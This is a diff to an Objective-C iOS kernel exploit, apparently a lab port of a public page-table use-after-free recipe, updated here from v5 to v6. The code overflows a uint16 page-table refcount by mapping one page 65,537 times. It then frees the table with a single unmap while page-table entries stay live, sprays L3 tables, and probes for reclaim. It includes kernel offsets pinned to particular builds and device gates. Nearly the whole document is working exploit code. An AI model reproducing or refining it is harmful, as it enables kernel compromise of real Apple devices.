@@ -19,7 +19,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P084_BUILD @"p084-pmap-tte-puaf-v5"
+#define P084_BUILD @"p084-pmap-tte-puaf-v6"
 
 /* P007 convention: local mach_vm prototypes, no <mach/mach_vm.h> */
 typedef unsigned long long p084_vmaddr_t;
@@ -57,11 +57,18 @@ kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
 /* recipe constants */
 #define P084_PAGE        0x4000ULL           /* Apple 16K page */
 #define P084_N_MAP       65537               /* wraps uint16 (65536+1) */
-#define P084_KEEP        64                  /* dangling-PTE survivors */
+#define P084_KEEP        64                  /* mass-mode dangling survivors */
 #define P084_VA_TOTAL    (P084_PAGE * P084_N_MAP)   /* ~1.07GB VA */
-#define P084_CHUNK       8192                /* unmap batch size */
+#define P084_CHUNK       8192                /* unmap batch size (mass mode) */
 #define P084_FILL        0x41
 #define P084_WATCH_SEC   60                  /* quarantine-release poll */
+#define P084_SPRAY       1024                /* C3 new-L3 attempts (v5 was 256) */
+
+/* v6 mode select. Default = SINGLE (v5 live 20:13 evidence: after 65,473
+   unmaps the free had NOT fired — C3 hit nothing, so the unmap count must
+   be exactly ONE decrement past the wrap: unmap page 65536 once, refcnt
+   1->0, 65,536 PTE-live mappings stay behind). Write
+   Documents/p084_mode_massunmap.txt to reproduce v5's "unmap all but 64". */
 
 static void *p084_surf = NULL;
 
@@ -115,9 +122,13 @@ static int p084_safe_u32(volatile void *p, uint32_t *out) {
     L([NSString stringWithFormat:@"=== p084 session %@ BUILD %@ ===",
         LabLocalMilitaryNow(), P084_BUILD]);
     L(@"pmap-tte-remove PUAF port (Indegosblade public recipe). uint16 pt_desc");
-    L(@"refcount wrap: 65,537 MAP_SHARED maps of ONE 16KB page, unmap all but 64.");
-    L(@"Runs on A14 23F77 AND A12X 23G71. A12X is the reclaim-viable class (no SPTM).");
-    L(@"23G71 pins: remove 0xa4df188 enter 0xa4e21d8 tte_dealloc 0x9e27f34. Do not paste onto T8101.");
+    L(@"refcount wrap: 65,537 MAP_SHARED maps of ONE 16KB page, then the");
+    L(@"recipe's single decrement drives refcount 1->0 (v6 DEFAULT; mass-unmap");
+    L(@"v5 variant behind Documents/p084_mode_massunmap.txt).");
+    L(@"SPTM note (honest): T8150 is SPTM. T8101/T8020 SPTM status is NOT pinned");
+    L(@"in this lab — the 23G71 Ghidra pins below do not paste onto T8101 either way.");
+    L(@"23G71 pins: remove 0xa4df188 enter 0xa4e21d8 tte_dealloc 0x9e27f34.");
+    L(@"Both A14 23F77 and A12X 23G71 run this tap; no reclaim claim from prose.");
     L(@"PANIC POSSIBLE - one tap per fresh boot.");
     NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p084"];
     if (stop) {
@@ -127,6 +138,18 @@ static int p084_safe_u32(volatile void *p, uint32_t *out) {
     }
     L([LabDeviceProfile identBlock]);
     L([NSString stringWithFormat:@"BUILD %@ — dual-SKU gate passed (unknown machines only are blocked)", P084_BUILD]);
+    BOOL p084_mass = NO;
+    {
+        /* v6: DEFAULT single-unmap (the recipe). Mass-unmap = v5 reproduction,
+           only when Documents/p084_mode_massunmap.txt exists. */
+        p084_mass = [[NSFileManager defaultManager] fileExistsAtPath:
+            [docs stringByAppendingPathComponent:@"p084_mode_massunmap.txt"]];
+        L([NSString stringWithFormat:@"[*] mode: %@",
+            p084_mass ? @"MASS-UNMAP (v5 reproduction)" : @"SINGLE-UNMAP (recipe: one decrement past the wrap)"]);
+    }
+    /* function-scope state shared by C3 / Phase E / VERDICT */
+    int spread = p084_mass ? 0 : 2048;
+    int p084_reclaimHits = 0;   /* C3 faults+changed, plus any Phase E release */
 
     /* ---- IOSurface dlopen+dlsym (CSRaceCalib pattern: framework is not
        loaded until something pulls it in — RTLD_DEFAULT alone fails) ---- */
@@ -208,24 +231,38 @@ static int p084_safe_u32(volatile void *p, uint32_t *out) {
         L([NSString stringWithFormat:@"[*] pre-unmap sanity survivor[0] fill=%@", sane ? @"OK" : @"BAD"]);
     }
 
-    /* ---- PHASE B: unmap all but KEEP=64. First decrement after the wrap
-       drives refcount 1->0 -> pmap_free_pt_delayed. Panic window is HERE. ---- */
+    /* ---- PHASE B (v6): drive refcount to EXACTLY 0 with one decrement.
+       After 65,537 maps refcount ≡ 1 (mod 65536). Single mode: unmap page
+       65536 ONCE → refcnt 0 → pmap_free_pt_delayed, with 65,536 PTE-live
+       mappings still resident (the PUAF). Mass mode = v5 reproduction. Panic
+       window is HERE. ---- */
     t0 = CFAbsoluteTimeGetCurrent();
-    for (uint32_t start = P084_KEEP; start < P084_N_MAP; start += P084_CHUNK) {
-        uint32_t end = start + P084_CHUNK;
-        if (end > P084_N_MAP) end = P084_N_MAP;
+    if (!p084_mass) {
         kr = mach_vm_deallocate(mach_task_self(),
-                                vaBase + (p084_vmaddr_t)start * P084_PAGE,
-                                (p084_vmaddr_t)(end - start) * P084_PAGE);
-        L([NSString stringWithFormat:@"  unmap [%u..%u) kr=0x%x",
-            start, end, kr]);
+            vaBase + (p084_vmaddr_t)(P084_N_MAP - 1) * P084_PAGE, P084_PAGE);
+        L([NSString stringWithFormat:@"  single unmap page 65536 kr=0x%x — refcount 1->0", kr]);
         if (kr != KERN_SUCCESS) {
-            L(@"[-] deallocate failed mid-recipe — state unknown, device may panic later");
+            L(@"[-] single unmap failed — state unknown, device may panic later");
             goto after_unmap;
         }
+    } else {
+        for (uint32_t start = P084_KEEP; start < P084_N_MAP; start += P084_CHUNK) {
+            uint32_t end = start + P084_CHUNK;
+            if (end > P084_N_MAP) end = P084_N_MAP;
+            kr = mach_vm_deallocate(mach_task_self(),
+                                    vaBase + (p084_vmaddr_t)start * P084_PAGE,
+                                    (p084_vmaddr_t)(end - start) * P084_PAGE);
+            L([NSString stringWithFormat:@"  unmap [%u..%u) kr=0x%x",
+                start, end, kr]);
+            if (kr != KERN_SUCCESS) {
+                L(@"[-] deallocate failed mid-recipe — state unknown, device may panic later");
+                goto after_unmap;
+            }
+        }
+        L([NSString stringWithFormat:@"[+] PHASE B mass mode unmapped %u mappings t=%.1fs (v5 reproduction)",
+            P084_N_MAP - P084_KEEP, CFAbsoluteTimeGetCurrent() - t0]);
     }
-    L([NSString stringWithFormat:@"[+] PHASE B unmapped %u mappings t=%.1fs — refcount should have hit 0",
-        P084_N_MAP - P084_KEEP, CFAbsoluteTimeGetCurrent() - t0]);
+    L([NSString stringWithFormat:@"[+] PHASE B done t=%.1fs", CFAbsoluteTimeGetCurrent() - t0]);
 
 after_unmap: ;
     /* ---- PHASE C: survivor read-back. 0x41 fill = pt page NOT freed.
@@ -279,7 +316,7 @@ after_unmap: ;
         kern_return_t firstKr = KERN_SUCCESS;
         /* v4 FIXED at 0x180000000 failed 512/512 (address not reserved).
            v5: mach_vm_map ANYWHERE, 32MB-aligned, so each page starts a new L3. */
-        for (int i = 0; i < 256; i++) {
+        for (int i = 0; i < P084_SPRAY; i++) {
             p084_vmaddr_t a = 0;
             kern_return_t k2 = mach_vm_map(mach_task_self(), &a, P084_PAGE,
                                            0x1FFFFFFULL, VM_FLAGS_ANYWHERE,
@@ -313,10 +350,17 @@ after_unmap: ;
         L([NSString stringWithFormat:@"[C3] L3 spray ok=%d fail=%d firstKr=0x%x",
             sprayed, sprayFail, firstKr]);
 
-        int faults = 0, unchanged = 0, changed = 0;
-        for (int k = 0; k < P084_KEEP; k++) {
+        /* v6: sample spread across ALL L3 tables backing the span — one VA
+           per table (every 2048 pages) plus the first 64 VAs. In single mode
+           survivors = 65536 mappings across 32 L3 tables, so first-64-only
+           would miss a reused table that doesn't back the span start. All
+           mappings alias the SAME page, so every healthy survivor reads
+           0xDEA1DEAD. */
+        int faults = 0, unchanged = 0, changed = 0, probed = 0;
+        for (int k = 0; k < P084_KEEP || (spread && k < 65536); k += (k < 64 ? 1 : spread)) {
             uint32_t val = 0;
             void *p = (void *)(uintptr_t)(vaBase + (p084_vmaddr_t)k * P084_PAGE);
+            probed++;
             if (!p084_safe_u32(p, &val)) {
                 faults++;
                 if (faults == 1)
@@ -329,6 +373,9 @@ after_unmap: ;
                     L([NSString stringWithFormat:@"[**] survivor %d now 0x%08x (was 0xDEA1DEAD)", k, val]);
             }
         }
+        L([NSString stringWithFormat:@"[C3] probe n=%d faults=%d unchanged=%d changed=%d",
+            probed, faults, unchanged, changed]);
+        p084_reclaimHits = faults + changed;
         L([NSString stringWithFormat:@"[C3] probe faults=%d unchanged=%d changed=%d",
             faults, unchanged, changed]);
         if (sprayed == 0) {
@@ -350,23 +397,29 @@ after_unmap: ;
 
     /* ---- PHASE E: quarantine-release poll. SPTM quarantine is a DELAYED
        free — if the frame is released and reallocated, survivor bytes change.
-       This is the unexplored conversion angle. ---- */
+       This is the unexplored conversion angle. v6 watches the same spread
+       set as C3 (first 64 VAs + one per L3 table in single mode). ---- */
     {
-        uint8_t snap[P084_KEEP][16];
-        for (int k = 0; k < P084_KEEP; k++) {
-            uint8_t *s = (uint8_t *)(uintptr_t)(vaBase + (p084_vmaddr_t)k * P084_PAGE);
-            for (int b = 0; b < 16; b++) snap[k][b] = p084_read8(s + b);
+        int watchIdx[128];
+        int watchN = 0;
+        for (int k = 0; k < P084_KEEP && watchN < 64; k++) watchIdx[watchN++] = k;
+        if (spread) for (int k = 64; k < 65536 && watchN < 96; k += spread) watchIdx[watchN++] = k;
+        /* spread is function-scope (v6): 0 in mass mode, 2048 in single mode */
+        static uint8_t snap[128][16];
+        for (int i = 0; i < watchN; i++) {
+            uint8_t *s = (uint8_t *)(uintptr_t)(vaBase + (p084_vmaddr_t)watchIdx[i] * P084_PAGE);
+            for (int b = 0; b < 16; b++) snap[i][b] = p084_read8(s + b);
         }
         for (int sec = 5; sec <= P084_WATCH_SEC && mine == g_gen; sec += 5) {
             sleep(5);
             int changed = 0;
             NSMutableString *who = [NSMutableString string];
-            for (int k = 0; k < P084_KEEP; k++) {
-                uint8_t *s = (uint8_t *)(uintptr_t)(vaBase + (p084_vmaddr_t)k * P084_PAGE);
+            for (int i = 0; i < watchN; i++) {
+                uint8_t *s = (uint8_t *)(uintptr_t)(vaBase + (p084_vmaddr_t)watchIdx[i] * P084_PAGE);
                 for (int b = 0; b < 16; b++) {
-                    if (p084_read8(s + b) != snap[k][b]) {
+                    if (p084_read8(s + b) != snap[i][b]) {
                         changed++;
-                        [who appendFormat:@"s%d ", k];
+                        [who appendFormat:@"s%d ", watchIdx[i]];
                         break;
                     }
                 }
@@ -374,9 +427,29 @@ after_unmap: ;
             L([NSString stringWithFormat:@"  watch+%ds changed=%d %@", sec, changed, who]);
             if (changed) {
                 L(@"[**] QUARANTINE RELEASE / REALLOC observed — poll-and-claim angle is live");
+                p084_reclaimHits += changed;
                 break;
             }
         }
+    }
+
+    /* ---- [VERDICT] structured line: which rung failed, mechanically. ---- */
+    {
+        const char *first_fail;
+        int fires = 0, ok = 1;
+        const char *stage = "b";   /* v6 rung under test = reclaim */
+        if (p084_reclaimHits > 0) {
+            first_fail = "none";
+        } else {
+            first_fail = "c0-or-b (free did not fire, or quarantine held past watch)";
+            ok = 0;
+        }
+        fires += 1;   /* the unmap decrement happened (mode line says which) */
+        L([NSString stringWithFormat:@"[VERDICT] stage=%s first_fail_stage=%s fires=%d ok=%d reclaim_hits=%d",
+            stage, first_fail, fires, ok, p084_reclaimHits]);
+        L(@"[VERDICT] semantics: rung-a=wrap fire, rung-b=reclaim, rung-c=PTE identify.");
+        L(@"[VERDICT] reclaim_hits=0 => free did not fire OR quarantine held —");
+        L(@"[VERDICT] compare the mode line above before drawing conclusions.");
     }
 
 abort:
